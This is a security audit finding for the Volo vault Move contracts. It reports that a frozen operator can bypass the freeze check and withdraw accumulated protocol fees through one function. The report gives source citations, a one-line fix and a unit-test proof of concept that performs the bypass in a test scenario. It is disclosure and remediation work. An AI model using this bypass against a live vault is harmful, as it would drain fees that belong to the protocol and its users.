# Audit Report

## Title
Frozen Operator Can Bypass Freeze Control to Retrieve Protocol Fees

## Summary
The `retrieve_deposit_withdraw_fee_operator` function lacks the operator freeze check that all other operator functions implement, allowing frozen operators to bypass the freeze control mechanism and extract accumulated protocol fees. This represents an inconsistent authorization pattern that undermines the operator freeze security control.

## Finding Description

The Volo vault protocol implements an operator freeze mechanism as a critical security control, allowing admins to disable problematic operators while preserving their capability objects. However, the `retrieve_deposit_withdraw_fee_operator` function contains a fundamental authorization gap.

**The Vulnerable Function:**

The function signature reveals the root cause - it lacks the `Operation` parameter entirely, making freeze status verification impossible: [1](#0-0) 

This function:
1. Accepts only an `OperatorCap` for authorization
2. Does NOT accept the `Operation` shared object as a parameter  
3. Therefore CANNOT call `vault::assert_operator_not_freezed(operation, cap)` to verify freeze status

**Contrast With All Other Operator Functions:**

Every other operator function in the protocol consistently implements the freeze check. Examples from `operation.move`: [2](#0-1) [3](#0-2) [4](#0-3) 

Examples from `reward_manager.move`: [5](#0-4) 

All operator functions follow this pattern:
- Accept both `operation: &Operation` and `cap: &OperatorCap` as parameters
- Call `vault::assert_operator_not_freezed(operation, cap);` as the first authorization check

**The Freeze Mechanism Implementation:**

The freeze mechanism itself is properly implemented: [6](#0-5) [7](#0-6) 

The freeze status is stored in the `Operation` struct: [8](#0-7) 

**Exploit Path:**

1. Admin freezes an operator using `set_operator_freezed(operation, op_cap_id, true)` due to malicious behavior or excessive losses
2. The frozen operator retains their `OperatorCap` object (capabilities are owned assets, not revoked by freezing)
3. Admin expects that `vault::assert_operator_not_freezed` prevents all operator actions by the frozen operator
4. However, the frozen operator can still call `retrieve_deposit_withdraw_fee_operator(cap, vault, amount)` directly
5. The function executes successfully without any freeze status check, extracting all accumulated protocol fees

**Why Existing Protections Fail:**

The authorization layer is incomplete - the function only verifies capability ownership but not freeze status, unlike all other operator functions. The underlying vault function merely checks vault status: [9](#0-8) 

## Impact Explanation

**Severity: Medium-High**

This vulnerability has concrete financial and security implications:

1. **Direct Financial Impact**: Frozen operators can extract accumulated deposit/withdraw fees from the vault. These fees represent user value collected during normal vault operations (configurable rates, default 10bp each for deposits/withdrawals).

2. **Security Control Bypass**: The operator freeze mechanism is designed as an emergency control to prevent problematic operators from performing privileged actions. This vulnerability completely bypasses that control for fee extraction.

3. **Undermines Admin Authority**: Admins freeze operators expecting that ALL operator functions are blocked. The existence of this bypass undermines trust in the freeze mechanism and admin's ability to enforce accountability.

4. **Protocol Invariant Violation**: Violates the critical invariant stated in the validation framework: "No unauthorized config/pause/status changes; operator freeze respected."

The impact is not theoretical - protocol fees accumulate during normal operations and represent real value that should only be accessible to authorized (non-frozen) operators or admins.

## Likelihood Explanation

**Likelihood: High**

The exploit is straightforward and requires no special preconditions:

1. **Simple Prerequisites**: The attacker only needs to possess an `OperatorCap` that has been frozen - a scenario that occurs during normal operations when admins freeze problematic operators.

2. **Clear Financial Motivation**: Once frozen (typically for causing losses or suspicious behavior), the operator has clear financial incentive to extract accumulated fees before remediation or capability revocation.

3. **Realistic Operational Scenario**:
   - Operator causes vault losses through risky DeFi strategies
   - Admin detects the issue and freezes the operator to prevent further damage
   - Admin verifies that frozen operator cannot execute deposits/withdrawals/operations
   - Frozen operator still calls `retrieve_deposit_withdraw_fee_operator` to extract all accumulated fees
   - Protocol loses fee revenue that should have been preserved

4. **No Additional Attack Vectors Required**: The vulnerability is directly reachable via a public function with no complex state setup needed.

## Recommendation

Add the `operation: &Operation` parameter and freeze check to match the authorization pattern used by all other operator functions:

```move
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    operation: &Operation,  // Add this parameter
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault::assert_operator_not_freezed(operation, cap);  // Add this check
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

This ensures consistency with the authorization pattern across the entire operator capability system and properly enforces the freeze control mechanism.

## Proof of Concept

```move
#[test]
public fun test_frozen_operator_can_still_retrieve_fees() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());
    
    // Initialize vault and create operator cap
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    init_vault::init_create_reward_manager<SUI_TEST_COIN>(&mut s);
    
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let operator_cap = vault_manage::create_operator_cap(&admin_cap, s.ctx());
        transfer::public_transfer(operator_cap, OWNER);
        s.return_to_sender(admin_cap);
    };
    
    // Accumulate some fees through deposits
    s.next_tx(OWNER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let admin_cap = s.take_from_sender<AdminCap>();
        vault_manage::set_deposit_fee(&admin_cap, &mut vault, 100);
        test_scenario::return_shared(vault);
        s.return_to_sender(admin_cap);
    };
    
    s.next_tx(OWNER);
    {
        let coin = coin::mint_for_testing<SUI_TEST_COIN>(1_000_000_000, s.ctx());
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut reward_manager = s.take_shared<RewardManager<SUI_TEST_COIN>>();
        
        let (_request_id, receipt, coin) = user_entry::deposit(
            &mut vault, &mut reward_manager, coin, 1_000_000_000,
            990_000_000, option::none(), &clock, s.ctx()
        );
        transfer::public_transfer(coin, OWNER);
        transfer::public_transfer(receipt, OWNER);
        test_scenario::return_shared(vault);
        test_scenario::return_shared(reward_manager);
    };
    
    // Freeze the operator
    s.next_tx(OWNER);
    {
        let mut operation = s.take_shared<Operation>();
        let operator_cap = s.take_from_sender<OperatorCap>();
        let admin_cap = s.take_from_sender<AdminCap>();
        
        vault_manage::set_operator_freezed(
            &admin_cap, &mut operation,
            operator_cap.operator_id(), true
        );
        
        // Verify operator is frozen
        assert!(vault::operator_freezed(&operation, operator_cap.operator_id()));
        
        test_scenario::return_shared(operation);
        s.return_to_sender(operator_cap);
        s.return_to_sender(admin_cap);
    };
    
    // EXPLOIT: Frozen operator can still retrieve fees
    s.next_tx(OWNER);
    {
        let operator_cap = s.take_from_sender<OperatorCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let operation = s.take_shared<Operation>();
        
        // Verify operator is still frozen
        assert!(vault::operator_freezed(&operation, operator_cap.operator_id()));
        
        // But can still extract fees - this should fail but doesn't!
        let fee_retrieved = vault_manage::retrieve_deposit_withdraw_fee_operator(
            &operator_cap, &mut vault, 10_000_000
        );
        
        assert!(fee_retrieved.value() == 10_000_000); // Exploit succeeds
        
        test_scenario::return_shared(operation);
        test_scenario::return_shared(vault);
        s.return_to_sender(operator_cap);
        fee_retrieved.destroy_for_testing();
    };
    
    clock.destroy_for_testing();
    s.end();
}
```

This test demonstrates that a frozen operator can successfully extract protocol fees despite being frozen, confirming the authorization bypass vulnerability.

### Citations

**File:** volo-vault/sources/manage.move (L150-156)
```text
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    _: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

**File:** volo-vault/sources/operation.move (L94-105)
```text
public fun start_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    defi_asset_ids: vector<u8>,
    defi_asset_types: vector<TypeName>,
    principal_amount: u64,
    coin_type_asset_amount: u64,
    ctx: &mut TxContext,
): (Bag, TxBag, TxBagForCheckValueUpdate, Balance<T>, Balance<CoinType>) {
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L209-218)
```text
public fun end_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    mut defi_assets: Bag,
    tx: TxBag,
    principal_balance: Balance<T>,
    coin_type_asset_balance: Balance<CoinType>,
) {
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L381-391)
```text
public fun execute_deposit<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    reward_manager: &mut RewardManager<PrincipalCoinType>,
    clock: &Clock,
    config: &OracleConfig,
    request_id: u64,
    max_shares_received: u256,
) {
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/reward_manager.move (L232-241)
```text

public fun add_new_reward_type<PrincipalCoinType, RewardCoinType>(
    self: &mut RewardManager<PrincipalCoinType>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    with_buffer: bool, // If true, create a new reward buffer distribution for the reward type
) {
    self.check_version();
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/volo_vault.move (L88-92)
```text
// Operation operation
public struct Operation has key, store {
    id: UID,
    freezed_operators: Table<address, bool>,
}
```

**File:** volo-vault/sources/volo_vault.move (L362-378)
```text
public(package) fun set_operator_freezed(
    operation: &mut Operation,
    op_cap_id: address,
    freezed: bool,
) {
    if (operation.freezed_operators.contains(op_cap_id)) {
        let v = operation.freezed_operators.borrow_mut(op_cap_id);
        *v = freezed;
    } else {
        operation.freezed_operators.add(op_cap_id, freezed);
    };

    emit(OperatorFreezed {
        operator_id: op_cap_id,
        freezed: freezed,
    });
}
```

**File:** volo-vault/sources/volo_vault.move (L380-393)
```text
public(package) fun assert_operator_not_freezed(operation: &Operation, cap: &OperatorCap) {
    let cap_id = cap.operator_id();
    // If the operator has ever been freezed, it will be in the freezed_operator map, check its value
    // If the operator has never been freezed, no error will be emitted
    assert!(!operator_freezed(operation, cap_id), ERR_OPERATOR_FREEZED);
}

public fun operator_freezed(operation: &Operation, op_cap_id: address): bool {
    if (operation.freezed_operators.contains(op_cap_id)) {
        *operation.freezed_operators.borrow(op_cap_id)
    } else {
        false
    }
}
```

**File:** volo-vault/sources/volo_vault.move (L1544-1556)
```text
public(package) fun retrieve_deposit_withdraw_fee<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    self.check_version();
    self.assert_normal();

    emit(DepositWithdrawFeeRetrieved {
        vault_id: self.vault_id(),
        amount: amount,
    });

    self.deposit_withdraw_fee_collected.split(amount)
```
